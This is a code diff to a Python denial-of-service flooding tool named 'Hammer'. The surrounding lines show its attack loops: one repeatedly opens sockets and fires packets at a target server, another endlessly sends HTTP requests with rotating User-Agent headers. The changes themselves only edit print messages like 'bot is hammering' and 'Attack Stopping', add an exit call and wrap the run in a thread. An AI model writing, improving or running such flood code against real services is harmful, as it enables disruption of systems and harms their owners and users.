@@ -156,7 +156,7 @@ class Hammer:
                 h_socket.connect((self.server, self.port))
                 if h_socket.sendto(packet, (self.server, self.port)):
                     h_socket.shutdown(1)
-                    print(f"{FontColors.blue(time.ctime())}", FontColors.green("<< Harrming Pcket Send << endl"))
+                    print(f"{FontColors.blue(time.ctime())}", FontColors.green("<< Hammering Pcket Send << endl"))
                 else:
                     h_socket.shutdown(1)
                 time.sleep(.1)
@@ -199,7 +199,7 @@ Connection: {DefaultHttpParameters.Headers.Connection}
             while True:
                 urllib.request.urlopen(urllib.request.Request(url, \
                 headers={'User-Agent': random.choice(DefaultHttpParameters.Headers.user_agents)}))
-                print(FontColors.blue("bot is harming"))
+                print(FontColors.blue("bot is hammering :0"))
                 time.sleep(.1)
         except:
             time.sleep(.1)
@@ -229,10 +229,12 @@ Connection: {DefaultHttpParameters.Headers.Connection}
                 self.queue_two.join()
 
             except (KeyboardInterrupt, SystemExit):
-                print(FontColors.blue(time.ctime())+FontColors.yellow("Attack Stopping"))
+                print(FontColors.blue(time.ctime())+FontColors.yellow(" << Attack Stopping << endl"))
+                sys.exit(0)
 
 if __name__ == "__main__":
     
     get_parameter()
     h = Hammer(host, port, turbo)
-    h.run()
+    threading.Thread(target=h.run(), daemon=True).start()
+    
